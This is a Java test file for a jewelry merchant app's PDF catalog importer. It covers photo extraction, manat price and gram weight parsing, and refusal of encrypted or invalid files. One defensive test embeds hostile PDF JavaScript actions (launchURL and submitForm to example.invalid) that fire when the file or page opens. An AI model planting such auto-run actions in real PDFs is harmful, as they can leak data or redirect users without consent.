package az.jeparla.merchant;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import java.awt.Color;
import java.awt.Graphics2D;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.math.BigDecimal;
import java.util.List;
import javax.imageio.ImageIO;
import org.apache.pdfbox.pdmodel.PDDocument;
import org.apache.pdfbox.pdmodel.PDPage;
import org.apache.pdfbox.pdmodel.PDPageContentStream;
import org.apache.pdfbox.pdmodel.common.PDRectangle;
import org.apache.pdfbox.pdmodel.encryption.AccessPermission;
import org.apache.pdfbox.pdmodel.encryption.StandardProtectionPolicy;
import org.apache.pdfbox.pdmodel.interactive.action.PDActionJavaScript;
import org.apache.pdfbox.pdmodel.interactive.action.PDPageAdditionalActions;
import org.apache.pdfbox.pdmodel.font.PDType1Font;
import org.apache.pdfbox.pdmodel.font.Standard14Fonts;
import org.apache.pdfbox.pdmodel.graphics.image.LosslessFactory;
import org.apache.pdfbox.pdmodel.graphics.image.PDImageXObject;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvSource;

/** Photos and suggestions out of a catalog PDF (#129). No Spring context, no storage. */
class CatalogPdfTests {

    private static BufferedImage photo(int width, int height, Color color) {
        BufferedImage image = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);
        Graphics2D g = image.createGraphics();
        g.setColor(color);
        g.fillRect(0, 0, width, height);
        g.dispose();
        return image;
    }

    /** Page 1: one product photo, a logo too small to be a product, and its text; page 2: text only. */
    static byte[] catalog(int pages) throws Exception {
        try (PDDocument document = new PDDocument()) {
            PDImageXObject product = LosslessFactory.createFromImage(document, photo(600, 400, Color.ORANGE));
            PDImageXObject logo = LosslessFactory.createFromImage(document, photo(80, 80, Color.BLACK));
            for (int i = 0; i < pages; i++) {
                PDPage page = new PDPage(PDRectangle.A4);
                document.addPage(page);
                try (PDPageContentStream content = new PDPageContentStream(document, page)) {
                    content.drawImage(logo, 20, 760, 40, 40);
                    if (i == 0) {
                        content.drawImage(product, 50, 300, 300, 200);
                    }
                    content.beginText();
                    content.setFont(new PDType1Font(Standard14Fonts.FontName.HELVETICA), 14);
                    content.newLineAtOffset(50, 250);
                    content.showText(i == 0 ? "Lale ring" : "Contacts");
                    content.newLineAtOffset(0, -20);
                    content.showText(i == 0 ? "4,20 gr" : "Baku");
                    content.newLineAtOffset(0, -20);
                    content.showText(i == 0 ? "1 250,50 AZN" : "");
                    content.endText();
                }
            }
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            document.save(out);
            return out.toByteArray();
        }
    }

    @Test
    void embeddedPhotosAreTakenAndAPageWithoutOneIsRendered() throws Exception {
        List<CatalogPdf.Photo> photos = CatalogPdf.photos(catalog(2));
        assertThat(photos).hasSize(2);
        CatalogPdf.Photo first = photos.get(0);
        assertThat(first.page()).isEqualTo(1);
        assertThat(first.width()).isEqualTo(600);
        assertThat(first.height()).isEqualTo(400);
        assertThat(first.onlyOneOnPage()).isTrue();
        BufferedImage decoded = ImageIO.read(new ByteArrayInputStream(first.jpeg()));
        assertThat(decoded.getWidth()).isEqualTo(600);
        // The logo is on every page and too small: never a draft. Page 2 has no photo, so it is rendered.
        assertThat(photos.get(1).page()).isEqualTo(2);
        assertThat(photos.get(1).width()).isGreaterThan(800);

        DraftSuggestions suggestions = DraftSuggestions.of(first.pageText());
        assertThat(suggestions.name()).isEqualTo("Lale ring");
        assertThat(suggestions.price()).isEqualByComparingTo("1250.50");
        assertThat(suggestions.weight()).isEqualByComparingTo("4.200");
        assertThat(suggestions.text()).isEqualTo("Lale ring\n4,20 gr\n1 250,50 AZN");
    }

    /**
     * A catalog like a seller's (#129 acceptance: "20 pages"): every page has its own product photo, the shop
     * logo and a caption with name, weight and price. Synthetic: a real seller's PDF is still to be tried.
     */
    static byte[] twentyPageCatalog() throws Exception {
        try (PDDocument document = new PDDocument()) {
            PDImageXObject logo = LosslessFactory.createFromImage(document, photo(80, 80, Color.BLACK));
            for (int i = 0; i < 20; i++) {
                PDImageXObject product = LosslessFactory.createFromImage(document,
                        photo(500 + i * 10, 640, new Color(150 + i * 5, 110, 40)));
                PDPage page = new PDPage(PDRectangle.A4);
                document.addPage(page);
                try (PDPageContentStream content = new PDPageContentStream(document, page)) {
                    content.drawImage(logo, 20, 760, 40, 40);
                    content.drawImage(product, 60, 280, 250, 320);
                    content.beginText();
                    content.setFont(new PDType1Font(Standard14Fonts.FontName.HELVETICA), 14);
                    content.newLineAtOffset(60, 240);
                    content.showText("Ring model " + (i + 1));
                    content.newLineAtOffset(0, -20);
                    content.showText((i + 2) + ",50 gr");
                    content.newLineAtOffset(0, -20);
                    content.showText((300 + i * 25) + " AZN");
                    content.endText();
                }
            }
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            document.save(out);
            return out.toByteArray();
        }
    }

    @Test
    void aTwentyPageCatalogGivesOneDraftPhotoPerPageWithItsSuggestions() throws Exception {
        List<CatalogPdf.Photo> photos = CatalogPdf.photos(twentyPageCatalog());

        assertThat(photos).hasSize(20);
        for (int i = 0; i < 20; i++) {
            CatalogPdf.Photo photo = photos.get(i);
            assertThat(photo.page()).isEqualTo(i + 1);
            assertThat(photo.width()).isEqualTo(500 + i * 10);
            assertThat(photo.height()).isEqualTo(640);
            assertThat(photo.onlyOneOnPage()).isTrue();
            assertThat(photo.jpeg()).startsWith((byte) 0xFF, (byte) 0xD8);
            DraftSuggestions suggestions = DraftSuggestions.of(photo.pageText());
            assertThat(suggestions.name()).isEqualTo("Ring model " + (i + 1));
            assertThat(suggestions.weight()).isEqualByComparingTo((i + 2) + ".5");
            assertThat(suggestions.price()).isEqualByComparingTo(String.valueOf(300 + i * 25));
        }
    }

    @Test
    void javaScriptInThePdfIsIgnoredAndOnlyThePhotosAreRead() throws Exception {
        byte[] withScripts;
        try (PDDocument document = new PDDocument()) {
            PDImageXObject product = LosslessFactory.createFromImage(document, photo(600, 400, Color.ORANGE));
            PDPage page = new PDPage(PDRectangle.A4);
            document.addPage(page);
            try (PDPageContentStream content = new PDPageContentStream(document, page)) {
                content.drawImage(product, 50, 300, 300, 200);
            }
            // Scripts a hostile catalog may carry: on open of the file and on open of the page.
            document.getDocumentCatalog().setOpenAction(
                    new PDActionJavaScript("app.launchURL('https://example.invalid/open', true);"));
            PDPageAdditionalActions pageActions = new PDPageAdditionalActions();
            pageActions.setO(new PDActionJavaScript("this.submitForm('https://example.invalid/page');"));
            page.setActions(pageActions);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            document.save(out);
            withScripts = out.toByteArray();
        }

        // PDFBox has no JavaScript engine: the actions are plain data that CatalogPdf never reads.
        List<CatalogPdf.Photo> photos = CatalogPdf.photos(withScripts);
        assertThat(photos).hasSize(1);
        assertThat(photos.get(0).width()).isEqualTo(600);
    }

    @Test
    void aPasswordProtectedPdfIsRefused() throws Exception {
        byte[] encrypted;
        try (PDDocument document = new PDDocument()) {
            document.addPage(new PDPage(PDRectangle.A4));
            StandardProtectionPolicy policy = new StandardProtectionPolicy("owner-secret", "", new AccessPermission());
            policy.setEncryptionKeyLength(128);
            document.protect(policy);
            ByteArrayOutputStream out = new ByteArrayOutputStream();
            document.save(out);
            encrypted = out.toByteArray();
        }
        assertThatThrownBy(() -> CatalogPdf.photos(encrypted))
                .isInstanceOf(CatalogPdf.Refused.class).hasMessage("merchant.pdf_encrypted");
    }

    @Test
    void tooManyPagesAndNonPdfFilesAreRefused() throws Exception {
        assertThatThrownBy(() -> CatalogPdf.photos(catalog(CatalogPdf.MAX_PAGES + 1)))
                .isInstanceOf(CatalogPdf.Refused.class).hasMessage("merchant.pdf_pages");
        assertThatThrownBy(() -> CatalogPdf.photos("%PDF-1.7 not really".getBytes()))
                .isInstanceOf(CatalogPdf.Refused.class).hasMessage("merchant.pdf_invalid");
    }

    @Test
    void bigImagesAreScaledDownToJpeg() throws Exception {
        BufferedImage fitted = CatalogPdf.fitted(photo(4000, 1000, Color.WHITE));
        assertThat(fitted.getWidth()).isEqualTo(CatalogPdf.MAX_OUTPUT_SIDE);
        assertThat(fitted.getHeight()).isEqualTo(500);
        assertThat(CatalogPdf.jpeg(fitted)).startsWith((byte) 0xFF, (byte) 0xD8);
    }

    @ParameterizedTest
    @CsvSource(delimiter = '|', value = {
            "Üzük 990 ₼            | 990.00",
            "Qiymət: 1 250,50 AZN   | 1250.50",
            "45 manat               | 45.00",
            "AZN 300                | 300.00",
            "₼ 99,9                 | 99.90"})
    void pricesInManat(String text, String expected) {
        assertThat(DraftSuggestions.price(text)).contains(new BigDecimal(expected));
    }

    @ParameterizedTest
    @CsvSource(delimiter = '|', value = {
            "Çəki 4,2 q      | 4.200",
            "3.25 gr         | 3.250",
            "5 g             | 5.000",
            "Вес 4,2 г       | 4.200",
            "3 qram          | 3.000"})
    void weightsInGrams(String text, String expected) {
        assertThat(DraftSuggestions.weight(text)).contains(new BigDecimal(expected));
    }

    @Test
    void noSuggestionWithoutAMatch() {
        assertThat(DraftSuggestions.price("Model 585, ölçü 17")).isEmpty();
        assertThat(DraftSuggestions.weight("Qızıl üzük 585")).isEmpty();
        assertThat(DraftSuggestions.of("").name()).isNull();
        assertThat(DraftSuggestions.of("").text()).isNull();
    }

    @Test
    void pageTextIsCleanedAndCut() {
        assertThat(DraftSuggestions.text("  Qızıl   üzük \u0000585 \r\n\n\t\nÇəki 3,2 q  "))
                .isEqualTo("Qızıl üzük 585\nÇəki 3,2 q");
        assertThat(DraftSuggestions.text(" \n \u0000 ")).isNull();
        String line = "a".repeat(999);
        String cut = DraftSuggestions.text((line + "\n").repeat(10));
        assertThat(cut).hasSize(4 * 999 + 3);
        assertThat(cut.length()).isLessThanOrEqualTo(DraftSuggestions.MAX_TEXT);
    }
}
